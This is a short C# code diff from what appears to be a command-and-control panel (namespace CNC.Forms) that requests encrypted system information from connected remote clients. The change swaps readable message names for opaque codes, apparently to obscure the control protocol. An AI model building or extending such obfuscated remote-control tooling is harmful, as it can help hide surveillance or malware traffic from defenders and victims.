@@ -28,7 +28,7 @@ namespace CNC.Forms
         {
             infoListView.Items.Clear();
             SystemInfo systemInfo = JsonConvert.DeserializeObject<SystemInfo>(Cryptography.Decrypt(
-                currentClient.Connection.SendReceiveObject<string, string>("GetSystemInfoReq", "GetSystemInfoRep", 20000, 
+                currentClient.Connection.SendReceiveObject<string, string>("0x26", "1x26", 20000, 
                 Cryptography.Encrypt(Guid.NewGuid().ToString()))));
 
             infoListView.Items.Add(new ListViewItem(new string[] {
